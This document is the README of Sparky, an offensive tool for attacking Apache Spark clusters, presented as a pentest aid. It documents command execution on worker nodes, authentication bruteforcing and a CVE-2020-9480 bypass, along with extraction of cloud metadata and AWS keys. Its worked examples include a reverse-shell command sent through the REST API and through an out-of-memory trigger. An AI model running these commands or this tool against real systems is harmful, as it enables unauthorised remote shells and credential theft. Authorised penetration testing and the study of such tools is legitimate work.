# Sparky

Sparky is a tool to easily abuse and pentest a Spark server in Standalone mode. (Some features work on a Yarn cluster as well)

## Features

* Get general information about the Spark cluster, from HTTP Web interface, REST API and through internal APIs
  * Spark version
  * Number of workers, CPU cores, memory
  * List of applications
* Execute arbitrary code on Spark workers (through a normal task or through the REST API)
* Explore temporary files and Jars used by other applications
* Bruteforce Spark authentication (fireSparky.py)
* Bypass authentication on a Spark Standalone master (CVE-2020-9480)
* Dump metadata and user data attached to workers in a Cloud environment


## Usage

```sh
          ____              __
         / __/__  ___ _____/ /_\ \   /
        _\ \/ _ \/ _ `/ __/  '_/\ ` /
       /___/ .__/\_,_/_/ /_/\_\ /  /
          /_/                  / /
                              //
                             /

       A tool to pentest Spark clusters
                        @uthor: @ayoul3

Sparky: a tool to pentest Spark clusters

positional arguments:
  spark_master          The master node of a Spark cluster host:port. If no
                        port is provided, default to 7077
  driver_ip             Local IP to bind to for communicating with spark
                        workers.

optional arguments:
  -h, --help            show this help message and exit

General:
  -i, --info            Check REST API, HTTP interface, list executor nodes,
                        version, applications if possible
  -A APPNAME, --appname APPNAME
                        Name of the app as it will appear in the spark logs
  -U USERNAME, --username USERNAME
                        Name of the user as it will appear in the spark logs
  -S SECRET, --secret SECRET
                        Secret to authenticate to Spark master when SASL
                        authentication is required
  -P PYBINARY, --py PYBINARY
                        Python binary to execute worker commands. Can be full
                        path. Version must match the binary used to execute
                        this tool.
  -D DRIVERPORT, --driver-port DRIVERPORT
                        Port to bind to on the computer to receive
                        communication from worker nodes. Default: 8080
  -B BLOCKMANAGERPORT, --blockManager-port BLOCKMANAGERPORT
                        Port to bind to on the computer to receive block data
                        from worker nodes. Default: 8443
  -f, --list-files      Gather list of files (jars, py, etc.) submitted to a
                        worker - usually contains sensitive information
  -k, --search          Search for patterns in files submitted to a worker.
                        Default Patterns hardcoded in utils/searchPass.py
  -e EXTENSION, --extension EXTENSION
                        Performs list and search operations on particular
                        extensions of files submitted to a worker: *.txt,
                        *.jar, *.py. Default: *
  -y, --yarn            Submits the spark application to a Yarn cluster
  -d HDFS, --hdfs HDFS  Full address of the HDFS cluster (host:ip)
  -r RESTPORT, --rest-port RESTPORT
                        Use this port to contact the REST API (default: 6066)
  -t HTTPPORT, --http-port HTTPPORT
                        Use this port to contact the HTTP master web page
                        (default: 8088)
  -q, --quiet           Hide the cool ascii art

Command execution:
  -c CMD, --cmd CMD     Execute a command on one or multiple worker nodes
  -s SCRIPT, --script SCRIPT
                        Execute a bash script on one or multiple worker nodes
  -b, --blind           Bypass authentication/encryption and blindly execute a
                        command on a random worker node
  -m MAXMEM, --max-memory MAXMEM
                        Maximum Heap memory allowed for the worker to make it
                        crash and execute code. Usually varies between 1 and
                        10 (MB) Use with "-b" option. Default: 2
  -n NUMWOKERS, --num-workers NUMWOKERS
                        Number of workers to execute a command/search on.
                        Default: 1
  -w [RESTJARURL], --rest-exec [RESTJARURL]
                        if empty, execute a system command (-c or -s) on a
                        random worker using OnOutOfMemoryError trick. You can
                        provide a legitimate jar file to execute instead.
                        Format: FULL_JAR_URL::MAIN_Class
  -x BINPATH, --runtime BINPATH
                        Shell binary to execute commands and scripts on
                        workers. Default:bash. Examples : sh, bash, zsh, ksh
  -a, --scala           Submit a pure Scala JAR file instead of a Python
                        wrapped Jar file.

Cloud environment (AWS, DigitalOcean):
  -u, --user-data       Gather userdata or custom data information
  -g, --meta-data       Gather metadata information from the cloud provider
  -p, --private-key     Extracts AWS private key and session token if a role
                        is attached to the instance (AWS only)
```
## Prerequisites
### Installation
Sparky is a wrapper of the official Pyspark tool. Therefore you need a valid Java 8 environment as well. Sparky supports both Python 2.7 and Python 3.x.  

```sh
git clone https://github.com/ayoul3/sparky && cd sparky
pip --no-cahe-dir install -r requirements.txt
sudo apt install -y openjdk-8-jdk
export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/

python sparky.py <spark_ip> <computer_ip> -i
``` 
*Make sure the version of your local pyspark version matches the spark version on the cluster*
```sh
python -m pip install pyspark==2.4.3
``` 

### Python Environment
The version of Python used to execute Sparky must match the default version of Python on the Worker node. Otherwise you will get the following exception:
```
Exception: Python in worker has different version 3.6 than that in driver 2.7, PySpark cannot run with different minor versions.Please check environment variables PYSPARK_PYTHON and PYSPARK_DRIVER_PYTHON are correctly set.
```
Try running sparky with a python version 3.6 or adding the flag -P python2 or executing a Scala payload (--scala)
 
### Network
Sparky binds to two ports 8080 and 8443 that need to be reachable from the Workers executing the code. Otherwise the job will get stuck at the following line:
```
[Stage 0:>                                            (0 + 0) / 10]
```

## Examples
### Code execution 1
Executing a command line provided that the network and python environment requirements check out.
Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
```sh
python sparky.py 192.168.1.30 192.168.1.22 -c "whoami"

[*] Testing target to confirm a spark master is running on 192.168.1.30:7077
[+] Spark master confirmed at 192.168.1.30:7077
[*] Initializing local Spark driver...This can take a little while
[*] Found a maximum of 1 workers that can be allocated
[*] Executing command on 1 workers
[+] Output of worker 0
hadoop
```
### Code execution 2
This time using Python 3 and a script file
Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
```sh
python sparky.py 192.168.1.30 192.168.1.22 -s "cmd.sh" -P python3

[*] Testing target to confirm a spark master is running on 192.168.1.30:7077
[+] Spark master confirmed at 192.168.1.30:7077
[*] Initializing local Spark driver...This can take a little while
[*] Found a maximum of 1 workers that can be allocated
[*] Executing command on 1 workers
[+] Output of worker 0
hadoop
```
### Code execution 3
This time using scala code
Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
```sh
python sparky.py 192.168.1.30 192.168.1.22 -c "whoami" --scala 
[*] Testing target to confirm a spark master is running on 192.168.1.30:7077
[+] Spark master confirmed at 192.168.1.30:7077
[*] Initializing local Spark driver...This can take a little while
[*] Found a maximum of 1 workers that can be allocated
[*] Executing command on 1 workers
[+] Output of worker 0
hadoop
```
### Blind code execution 4
Executing a JAR file using REST API on port 6066
Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
```sh
python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/443 0>&1" -w https://www.domain.com/file.jar

[*] Testing target to confirm a spark master is running on 192.168.1.30:7077
[+] Spark master confirmed at 192.168.1.30:7077
[+] Command successfully executed on a random worker
```
Omitting the JAR URL works as well, but uses a different trigger to execute code. See OnOutofMemory below

### Blind code execution 5 - Authentication bypass
Blind code execution using OnOutOfMemory parameter to trigger code execution. Need to adjust the "-m" parameter which refers to maximum heap memory allocated by JVM.
Spark master is listening at 192.168.1.30:7077. Your computer is 192.168.1.22
```sh
python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tcp/192.168.1.22/443 0>&1" -b

[*] Testing target to confirm a spark master is running on 192.168.1.30:7077
[+] Spark master confirmed at 192.168.1.30:7077
[*] Performing blind command execution on workers
[*] Executing command on a random worker
[+] Positive response from the Master
[*] If cmd failed, adjust the -m param to make sure to case an out of memory error
```

## Licence
Sparky is licenced under GPLv3